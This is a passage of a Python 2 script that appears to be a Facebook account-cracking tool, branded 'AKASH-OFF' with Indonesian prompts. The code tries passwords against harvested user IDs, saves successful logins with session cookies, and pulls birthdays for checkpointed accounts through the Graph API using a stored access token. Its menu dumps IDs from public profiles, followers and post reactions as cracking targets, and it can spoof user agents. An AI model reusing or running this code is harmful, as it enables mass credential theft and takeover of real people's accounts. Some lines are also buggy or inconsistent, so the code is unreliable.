            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %sAKASH-OFF %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %sAKASH-OFF %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print '\r %sAKASH-OFF %s ◊ %s              ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('AKASH/OFF-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print('\r %sCracking %s/%s [ON-:%s]-[OFF-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] View user agents "%(P,K,P))
	print (" [%s02%s] Check user agents "%(K,P))
	print (" [%s00%s] Log out "%(M,P))
	uas()
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K))
    if u == '':
        print("%s [!] Brother Paste Token Again "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt as er:
			exit ("\x1b[1;91m [!] "+er) 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] Brother Paste Token Again "%(M));jeda(2);uas()
# MENU INI AJG
def menu():
    os.system('clear')
    try:
    	romz = open('token.txt', 'r').read()
    except IOError:
        print ("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf token.txt');masuk()
    try:
        r = requests.get('https://graph.facebook.com/me?access_token='+romz,headers=header)
        a = json.loads(r.text)
        nama = a["name"]
    except KeyError:
        print("%s [!] Token invalid "%(M));jeda(2);os.system('rm -rf data/token.txt && rm -rf data/cookies');masuk()
    except requests.exceptions.ConnectionError:
        exit("%s [!] Kesalahan koneksi "%(M))
    banner()
    print ('\n %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
    print (' [%s01%s] Dump id public'%(K,P)) 
    print (' [%s02%s] Dump id followers'%(K,P)) 
    print (' [%s03%s] Dump id reaction post'%(K,P)) 
    print (' [%s04%s] %sStart crack %s'%(K,P,H,P)) 
    print (' [%s05%s] Check user agent'%(K,P)) 
    print (' [%s06%s] Check crack result'%(K,P)) 
    #print (' [%s07%s] Gabung group'%(K,P))
    #print (' [%s08%s] Info script'%(K,P))
    print (' [%s00%s] Log out (Accesss token)'%(M,P))
    unik = raw_input('\n%s [?] Menu : %s'%(P,K))
    if unik == '':
        print("%s [!] Brother Paste Token Again "%(M));jeda(2);menu()
    elif unik in['1','01']:
        publik(romz)
    elif unik in['2','02']:
        followers(romz)
    elif unik in['3','03']:
        postingan(romz)
    elif unik in['4','04']:
        ngentod().romiy()
    elif unik in['5','05']:
    	useragent()
    elif unik in['6','06']:
    	try:
            dirs = os.listdir("hasil")
            print
            for file in dirs:
                print("%s -> %s%s"%(K,P,file));jeda(0.2)
            print("\n %s[%s!%s] cth : OFF-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
            file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
            if file == "":
                print("%s [!] file tidak ada "%(M))
            total = open("hasil/%s"%(file)).read().splitlines()
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            for akun in total:
            	fb = akun.replace("\n","")
                tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
                print(tling);jeda(0.03)
            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
        except (IOError):
            print("\n%s [!] tidak ada hasil "%(M))
            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
    elif unik in['7','07']:
        os.system("xdg-open https://t.me/EXPERTZONE1")
    elif unik in['8','08']:
        print(ingfo)
    elif unik in['0','00']:
        print ('')
        tik();jeda(1);os.system('rm -rf token.txt')
        jalan('\n%s [√] berhasil terhapus '%(H));exit()
    else:
        print("%s [!] Brother Paste Token Again "%(M));jeda(2);menu()
        
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
